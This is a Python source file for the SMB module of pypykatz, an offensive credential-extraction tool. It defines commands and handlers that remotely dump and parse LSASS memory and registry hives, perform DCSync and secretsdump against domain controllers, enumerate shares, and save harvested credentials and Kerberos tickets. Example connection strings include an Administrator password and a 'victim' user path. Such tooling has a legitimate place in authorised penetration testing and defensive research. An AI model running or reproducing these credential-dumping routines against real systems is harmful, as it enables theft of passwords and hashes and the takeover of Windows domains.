

#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import os
import json
import ntpath
import asyncio
import platform
import argparse
import base64
import traceback

from pypykatz import logging
from pypykatz.commons.common import UniversalEncoder
from pypykatz.alsadecryptor.packages.msv.decryptor import LogonSession


"""
This is a wrapper for aiosmb
"""

class SMBCMDArgs:
	def __init__(self):
		self.smb_url = None
		self.verbose = 0
		self.silent = True
		self.smb_url = None
		self.no_interactive = False
		self.commands = ['login', 'i']

smb_live_epilog = 'FOR AVAILABLE SUBCOMMANDS TYPE "... smb help" insted of "-h" '
class SMBCMDHelper:
	def __init__(self):
		self.live_keywords = ['smb']
		self.keywords = ['smb']
		
	def add_args(self, parser, live_parser):
		smb_group = parser.add_parser('smb', help='SMB related commands')
		smb_subparsers = smb_group.add_subparsers()
		smb_subparsers.required = True
		smb_subparsers.dest = 'smb_module'

		smb_client_group = smb_subparsers.add_parser('client', help='SMB client. Use "help" instead of "-h" to get the available subcommands')
		smb_client_group.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		smb_client_group.add_argument('url', help="SMB connection string")
		smb_client_group.add_argument('commands', nargs='*', help="!OPTIONAL! Takes a series of commands which will be executed until error encountered. If the command is 'i' is encountered during execution it drops back to interactive shell.")
		
		smb_lsassfile_group = smb_subparsers.add_parser('lsassfile', help='Parse a remote LSASS dump file.')
		smb_lsassfile_group.add_argument('url', help="SMB connection string with file in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/lsass.DMP'")
		smb_lsassfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_lsassfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_lsassfile_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_lsassfile_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
		smb_lsassfile_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
		smb_lsassfile_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')


		smb_lsassdump_group = smb_subparsers.add_parser('lsassdump', help='Remotely dumps and parses LSASS')
		smb_lsassdump_group.add_argument('url', help="SMB connection string Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102'")
		smb_lsassdump_group.add_argument('-m','--method', choices=['taskexec'] , default = 'taskexec', help = 'Print credentials in JSON format')
		smb_lsassdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_lsassdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_lsassdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_lsassdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
		smb_lsassdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
		smb_lsassdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')



		smb_regfile_group = smb_subparsers.add_parser('regfile', help='Parse a remote registry hive dumps')
		smb_regfile_group.add_argument('url', help="SMB connection string with folder in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/'")
		smb_regfile_group.add_argument('system', help='path to the SYSTEM registry hive')
		smb_regfile_group.add_argument('--sam', help='path to the SAM registry hive')
		smb_regfile_group.add_argument('--security', help='path to the SECURITY registry hive')
		smb_regfile_group.add_argument('--software', help='path to the SOFTWARE registry hive')
		smb_regfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_regfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		
		smb_regsec_group = smb_subparsers.add_parser('regdump', help='Remotely dumps and parses registry')
		smb_regsec_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102'")
		smb_regsec_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_regsec_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')

		smb_dcsync_group = smb_subparsers.add_parser('dcsync', help='DcSync')
		smb_dcsync_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.2'")
		smb_dcsync_group.add_argument('-u', '--username', help='taget username')
		smb_dcsync_group.add_argument('-o', '--outfile', help = 'Save results to file')

		smb_secretsdump_group = smb_subparsers.add_parser('secretsdump', help='secretsdump')
		smb_secretsdump_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/'")
		smb_secretsdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_secretsdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_secretsdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_secretsdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
		smb_secretsdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
		smb_secretsdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')



		smb_shareenum_parser = smb_subparsers.add_parser('shareenum', help = 'SMB share enumerator')
		smb_shareenum_parser.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		smb_shareenum_parser.add_argument('--depth', type=int, default =3, help="Maximum level of folders to enum")
		smb_shareenum_parser.add_argument('--maxitems', type=int, default = None, help="Maximum number of items per forlder to enumerate")
		smb_shareenum_parser.add_argument('--dirsd', action='store_true', help="Fetch Security Descriptors for folders")
		smb_shareenum_parser.add_argument('--filesd', action='store_true', help="Fetch Security Descriptors for files")
		smb_shareenum_parser.add_argument('-w', '--worker-count', type=int, default = 10, help="Number of parallell enum workers. Always one worker/host")
		smb_shareenum_parser.add_argument('-l', '--ldap', help="Use LDAP to get a list of machines to enumerate. This will return dns names so be carefule to have a correct DNS server config!")
		smb_shareenum_parser.add_argument('--progress', action='store_true', help="Progress bar. Please use it with output-file set!")
		smb_shareenum_parser.add_argument('-o','--out-file', help="Output file")
		smb_shareenum_parser.add_argument('--json', action='store_true', help="Output format is JSON")
		smb_shareenum_parser.add_argument('--tsv', action='store_true', help="Output format is TSV")
		smb_shareenum_parser.add_argument('-t', '--target', nargs='*', help="Files/IPs/Hostnames for targets. Can be omitted if LDAP is used")
		smb_shareenum_parser.add_argument('--max-runtime', type=int, default = None, help="Maximum runtime per host (in seconds)")
		smb_shareenum_parser.add_argument('--es', '--exclude-share', nargs='*', help = 'Exclude shares with name specified')
		smb_shareenum_parser.add_argument('--ed', '--exclude-dir', nargs='*', help = 'Exclude directories with name specified')
		smb_shareenum_parser.add_argument('--et', '--exclude-target', nargs='*', help = 'Exclude hosts from enumeration')
		smb_shareenum_parser.add_argument('smb_url', help = 'SMB connection string. Credentials specified here will be used to perform the enumeration')




		live_subcommand_parser = argparse.ArgumentParser(add_help=False)                                                                                                  
		live_smb_subparsers = live_subcommand_parser.add_subparsers(help = 'LIVE SMB commands work under the current user context.')
		live_smb_subparsers.required = True
		live_smb_subparsers.dest = 'livesmbcommand'

		live_client_parser = live_smb_subparsers.add_parser('client', help = 'SMB (live) client. Use "help" instead of "-h" to get the available subcommands')
		live_client_parser.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'ntlm', help= 'Authentication method to use during login')
		live_client_parser.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_client_parser.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		live_client_parser.add_argument('host', help='Target host to connect to')
		live_client_parser.add_argument('commands', nargs='*', help="!OPTIONAL! Takes a series of commands which will be executed until error encountered. If the command is 'i' is encountered during execution it drops back to interactive shell.")

		live_lsassdump_group = live_smb_subparsers.add_parser('lsassdump', help='Remotely dumps and parses LSASS')
		live_lsassdump_group.add_argument('host', help='Target host to connect to')
		live_lsassdump_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
		live_lsassdump_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_lsassdump_group.add_argument('-m','--method', choices=['taskexec'] , default = 'taskexec', help = 'Print credentials in JSON format')
		live_lsassdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		live_lsassdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		live_lsassdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		live_lsassdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
		live_lsassdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
		live_lsassdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')

		
		live_regsec_group = live_smb_subparsers.add_parser('regdump', help='Remotely dumps and parses registry')
		live_regsec_group.add_argument('host', help='Target host to connect to')
		live_regsec_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
		live_regsec_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_regsec_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		live_regsec_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')

		live_dcsync_group = live_smb_subparsers.add_parser('dcsync', help='DcSync')
		live_dcsync_group.add_argument('host', help='Target host to connect to')
		live_dcsync_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
		live_dcsync_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_dcsync_group.add_argument('-u', '--username', help='taget username')
		live_dcsync_group.add_argument('-o', '--outfile', help = 'Save results to file')

		live_secretsdump_group = live_smb_subparsers.add_parser('secretsdump', help='secretsdump')
		live_secretsdump_group.add_argument('host', help='Target host to connect to')
		live_secretsdump_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
		live_secretsdump_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_secretsdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		live_secretsdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		live_secretsdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		live_secretsdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
		live_secretsdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
		live_secretsdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')

		live_shareenum_parser = live_smb_subparsers.add_parser('shareenum', help = 'SMB (live) share enumerator. THE DEFAULT SETTINGS ARE OPTIMIZED TO WORK ON DOMAIN-JOINED MACHINES. This will start enumeration using the current user credentials.')
		live_shareenum_parser.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
		live_shareenum_parser.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_shareenum_parser.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		live_shareenum_parser.add_argument('--depth', type=int, default =3, help="Maximum level of folders to enum")
		live_shareenum_parser.add_argument('--maxitems', type=int, default = None, help="Maximum number of items per forlder to enumerate")
		live_shareenum_parser.add_argument('--dirsd', action='store_true', help="Fetch Security Descriptors for folders")
		live_shareenum_parser.add_argument('--filesd', action='store_true', help="Fetch Security Descriptors for files")
		live_shareenum_parser.add_argument('-w', '--worker-count', type=int, default = 10, help="Number of parallell enum workers. Always one worker/host")
		live_shareenum_parser.add_argument('--skip-ldap', action='store_true', help="Skip fetching target hosts via LDAP")
		live_shareenum_parser.add_argument('--progress', action='store_true', help="Progress bar. Please use it with output-file set!")
		live_shareenum_parser.add_argument('-o','--out-file', help="Output file")
		live_shareenum_parser.add_argument('--json', action='store_true', help="Output format is JSON")
		live_shareenum_parser.add_argument('--tsv', action='store_true', help="Output format is TSV")
		live_shareenum_parser.add_argument('-t', '--target', nargs='*', help="Files/IPs/Hostnames for targets. Can be omitted if LDAP is used")
		live_shareenum_parser.add_argument('--max-runtime', type=int, default = None, help="Maximum runtime per host (in seconds)")
		live_shareenum_parser.add_argument('--es', '--exclude-share', nargs='*', help = 'Exclude shares with name specified')
		live_shareenum_parser.add_argument('--ed', '--exclude-dir', nargs='*', help = 'Exclude directories with name specified')
		live_shareenum_parser.add_argument('--et', '--exclude-target', nargs='*', help = 'Exclude hosts from enumeration')


		live_group = live_parser.add_parser('smb', help='SMB (live) commands', epilog=smb_live_epilog, parents=[live_subcommand_parser])
		
		
	def execute(self, args):
		if args.command in self.keywords:
			asyncio.run(self.run(args))
		
		if len(self.live_keywords) > 0 and args.command == 'live' and args.module in self.live_keywords:
			asyncio.run(self.run_live(args))
			
			
	async def run_live(self, args):
		if platform.system().lower() != 'windows':
			raise Exception('Live commands only work on Windows!')

		from aiosmb import logger as smblog
		from winacl.functions.highlevel import get_logon_info
		
		info = get_logon_info()
		if args.livesmbcommand != 'shareenum':
			smb_url = 'smb%s+sspi-%s://%s\\%s@%s' % (args.protocol_version, args.authmethod, info['domain'], info['username'], args.host)

		if args.verbose == 0:
			smblog.setLevel(100)
		elif args.verbose == 1:
			smblog.setLevel(level=logging.INFO)
		else:
			level = 5 - args.verbose
			smblog.setLevel(level=level)

		if args.livesmbcommand == 'client':
			from aiosmb.examples.smbclient import amain
			
			
			la = SMBCMDArgs()
			la.smb_url = smb_url
			la.verbose = args.verbose

			if args.commands is not None and len(args.commands) > 0:
				la.commands = []
				if args.commands[0] == 'help':
					la.commands = ['help']
				else:
					if args.commands[0] != 'login':
						la.commands.append('login')
					
					for command in args.commands:
						la.commands.append(command)

			await amain(la)


		elif args.livesmbcommand == 'lsassdump':
			from pypykatz.smb.lsassutils import lsassdump
			mimi = await lsassdump(smb_url, chunksize=args.chunksize, packages=args.packages)
			self.process_results({'smbfile':mimi}, [], args)

		elif args.livesmbcommand == 'secretsdump':
			from pypykatz.smb.lsassutils import lsassdump
			from pypykatz.smb.regutils import regdump
			from pypykatz.smb.dcsync import dcsync

			try:
				mimi = await lsassdump(smb_url, chunksize=args.chunksize, packages=args.packages)
				if mimi is not None:
					self.process_results({'smbfile':mimi}, [], args, file_prefix='_lsass.txt')
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get LSASS secrets')
			
			try:
				po = await regdump(smb_url)
				if po is not None:
					if args.outfile:
						po.to_file(args.outfile+'_registry.txt', args.json)
					else:
						if args.json:
							print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
						else:
							print(str(po))
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get registry secrets')
			

			try:
				if args.outfile is not None:
					outfile = open(args.outfile+'_dcsync.txt', 'w', newline = '')

				async for secret in dcsync(smb_url):
					if args.outfile is not None:
						outfile.write(str(secret))
					else:
						print(str(secret))

			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to perform DCSYNC')
			finally:
				if args.outfile is not None:
					outfile.close()
		
		elif args.livesmbcommand == 'dcsync':
			from pypykatz.smb.dcsync import dcsync
			
			if args.outfile is not None:
				outfile = open(args.outfile, 'w', newline = '')

			async for secret in dcsync(smb_url, args.username):
				if args.outfile is not None:
					outfile.write(str(secret))
				else:
					print(str(secret))

			if args.outfile is not None:
				outfile.close()
		
		elif args.livesmbcommand == 'regdump':
			from pypykatz.smb.regutils import regdump
			po = await regdump(smb_url)

			if po is not None:
				if args.outfile:
					po.to_file(args.outfile, args.json)
				else:
					if args.json:
						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
					else:
						print(str(po))

		elif args.livesmbcommand == 'shareenum':
			from pypykatz.smb.shareenum import shareenum

			output_type = 'str'
			if args.json is True:
				output_type = 'json'
			if args.tsv is True:
				output_type = 'tsv'

			exclude_share = []
			if args.es is not None:
				exclude_share = args.es
			
			exclude_dir = []
			if args.ed is not None:
				exclude_dir = args.ed

			ldap_url = 'auto'
			if args.skip_ldap is True:
				ldap_url = None
			
			exclude_target = []
			if args.et is not None:
				exclude_target = args.et
			
			await shareenum(
				smb_url = 'auto',
				targets = args.target, 
				smb_worker_count = args.worker_count, 
				depth = args.depth, 
				out_file = args.out_file, 
				progress = args.progress, 
				max_items = args.maxitems, 
				dirsd = args.dirsd, 
				filesd = args.filesd, 
				authmethod = args.authmethod,
				protocol_version = args.protocol_version,
				output_type = output_type,
				max_runtime = args.max_runtime,
				exclude_share = exclude_share,
				exclude_dir = exclude_dir,
				ldap_url = ldap_url,
				exclude_target = exclude_target,
			)

			
	async def run(self, args):

		from aiosmb import logger as smblog

		if args.verbose == 0:
			smblog.setLevel(100)
		elif args.verbose == 1:
			smblog.setLevel(level=logging.INFO)
		else:
			level = 5 - args.verbose
			smblog.setLevel(level=level)
		
		if args.smb_module == 'lsassfile':
			from pypykatz.smb.lsassutils import lsassfile
			mimi = await lsassfile(args.url, chunksize=args.chunksize, packages=args.packages)
			self.process_results({'smbfile':mimi}, [], args)

		elif args.smb_module == 'lsassdump':
			from pypykatz.smb.lsassutils import lsassdump
			mimi = await lsassdump(args.url, chunksize=args.chunksize, packages=args.packages)
			self.process_results({'smbfile':mimi}, [], args)

		elif args.smb_module == 'secretsdump':
			from pypykatz.smb.lsassutils import lsassdump
			from pypykatz.smb.regutils import regdump
			from pypykatz.smb.dcsync import dcsync

			try:
				mimi = await lsassdump(args.url, chunksize=args.chunksize, packages=args.packages)
				if mimi is not None:
					self.process_results({'smbfile':mimi}, [], args, file_prefix='_lsass.txt')
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get LSASS secrets')
			
			try:
				po = await regdump(args.url)
				if po is not None:
					if args.outfile:
						po.to_file(args.outfile+'_registry.txt', args.json)
					else:
						if args.json:
							print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
						else:
							print(str(po))
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get registry secrets')
			

			try:
				if args.outfile is not None:
					outfile = open(args.outfile+'_dcsync.txt', 'w', newline = '')

				async for secret in dcsync(args.url):
					if args.outfile is not None:
						outfile.write(str(secret))
					else:
						print(str(secret))

			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to perform DCSYNC')
			finally:
				if args.outfile is not None:
					outfile.close()
		
		elif args.smb_module == 'dcsync':
			from pypykatz.smb.dcsync import dcsync
			
			if args.outfile is not None:
				outfile = open(args.outfile, 'w', newline = '')

			async for secret in dcsync(args.url, args.username):
				if args.outfile is not None:
					outfile.write(str(secret))
				else:
					print(str(secret))

			if args.outfile is not None:
				outfile.close()
		
		elif args.smb_module == 'regdump':
			from pypykatz.smb.regutils import regdump
			po = await regdump(args.url)

			if po is not None:
				if args.outfile:
					po.to_file(args.outfile, args.json)
				else:
					if args.json:
						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
					else:
						print(str(po))
		
		elif args.smb_module == 'regfile':
			from pypykatz.smb.regutils import regfile
			po = await regfile(args.url, args.system, sam = args.sam, security = args.security, software = args.software)

			if po is not None:
				if args.outfile:
					po.to_file(args.outfile, args.json)
				else:
					if args.json:
						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
					else:
						print(str(po))
		
		elif args.smb_module == 'shareenum':
			from pypykatz.smb.shareenum import shareenum


			output_type = 'str'
			if args.json is True:
				output_type = 'json'
			if args.tsv is True:
				output_type = 'tsv'

			exclude_share = []
			if args.es is not None:
				exclude_share = args.es
			
			exclude_dir = []
			if args.ed is not None:
				exclude_dir = args.ed

			exclude_target = []
			if args.et is not None:
				exclude_target = args.et

			
			await shareenum(
				args.smb_url,
				targets = args.target,  
				smb_worker_count = args.worker_count, 
				depth = args.depth, 
				out_file = args.out_file, 
				progress = args.progress, 
				max_items = args.maxitems, 
				dirsd = args.dirsd, 
				filesd = args.filesd, 
				output_type = output_type,
				max_runtime = args.max_runtime,
				exclude_share = exclude_share,
				exclude_dir = exclude_dir,
				ldap_url = args.ldap,
				exclude_target = exclude_target,
			)


		elif args.smb_module == 'client':
			from aiosmb.examples.smbclient import amain
			la = SMBCMDArgs()
			la.smb_url = args.url
			la.verbose = args.verbose
			if args.commands is not None and len(args.commands) > 0:
				la.commands = []
				if args.commands[0] == 'help':
					la.commands = ['help']
				else:
					if args.commands[0] != 'login':
						la.commands.append('login')
					
					for command in args.commands:
						la.commands.append(command)

			await amain(la)

	def process_results(self, results, files_with_error, args, file_prefix = ''):
		if args.outfile and args.json:
			with open(args.outfile+file_prefix, 'w') as f:
				json.dump(results, f, cls = UniversalEncoder, indent=4, sort_keys=True)

		elif args.outfile and args.grep:
			with open(args.outfile+file_prefix, 'w', newline = '') as f:
				f.write(':'.join(LogonSession.grep_header) + '\r\n')
				for result in results:
					for luid in results[result].logon_sessions:
						for row in results[result].logon_sessions[luid].to_grep_rows():
							f.write(':'.join(row) + '\r\n')
		
		elif args.outfile:
			with open(args.outfile+file_prefix, 'w') as f:
				for result in results:
					f.write('FILE: ======== %s =======\n' % result)
					
					for luid in results[result].logon_sessions:
						f.write('\n'+str(results[result].logon_sessions[luid]))
					
					if len(results[result].orphaned_creds) > 0:
						f.write('\n== Orphaned credentials ==\n')
						for cred in results[result].orphaned_creds:
							f.write(str(cred))
					
				if len(files_with_error) > 0:
					f.write('\n== Failed to parse these files:\n')
					for filename in files_with_error:
						f.write('%s\n' % filename)
						
		elif args.json:
			print(json.dumps(results, cls = UniversalEncoder, indent=4, sort_keys=True))
		
		elif args.grep:
			print(':'.join(LogonSession.grep_header))
			for result in results:
				for luid in results[result].logon_sessions:
					for row in results[result].logon_sessions[luid].to_grep_rows():
						print(':'.join(row))
				for cred in results[result].orphaned_creds:
					t = cred.to_dict()
					if t['credtype'] != 'dpapi':
						if t['password'] is not None:
							x =  [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '', str(t['password'])]
							print(':'.join(x))
					else:
						t = cred.to_dict()
						x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
						print(':'.join(x))
				
				for pkg, err in results[result].errors:
					err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
					err_str = base64.b64encode(err_str.encode()).decode()
					x =  [pkg+'_exception_please_report', '', '', '', '', '', '', '', '', err_str]
					print(':'.join(x) + '\r\n')
		else:
			for result in results:
				print('FILE: ======== %s =======' % result)	
				if isinstance(results[result], str):
					print(results[result])
				else:
					for luid in results[result].logon_sessions:
						print(str(results[result].logon_sessions[luid]))
							
					if len(results[result].orphaned_creds) > 0:
						print('== Orphaned credentials ==')
						for cred in results[result].orphaned_creds:
							print(str(cred))
					
					if len(results[result].errors) > 0:
						print('== Errors ==')
						for pkg, err in results[result].errors:
							err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
							err_str = base64.b64encode(err_str.encode()).decode()
							print('%s %s' % (pkg+'_exception_please_report',err_str))
					
							
					

			if len(files_with_error) > 0:			
				print('\n==== Parsing errors:')
				for filename in files_with_error:
					print(filename)
		
		
		if args.kerberos_dir:
			dir = os.path.abspath(args.kerberos_dir)
			logging.info('Writing kerberos tickets to %s' % dir)
			for filename in results:
				base_filename = ntpath.basename(filename)
				ccache_filename = '%s_%s.ccache' % (base_filename, os.urandom(4).hex()) #to avoid collisions
				results[filename].kerberos_ccache.to_file(os.path.join(dir, ccache_filename))
				for luid in results[filename].logon_sessions:
					for kcred in results[filename].logon_sessions[luid].kerberos_creds:
						for ticket in kcred.tickets:
							ticket.to_kirbi(dir)
							
				for cred in results[filename].orphaned_creds:
					if cred.credtype == 'kerberos':
						for ticket in cred.tickets:
							ticket.to_kirbi(dir)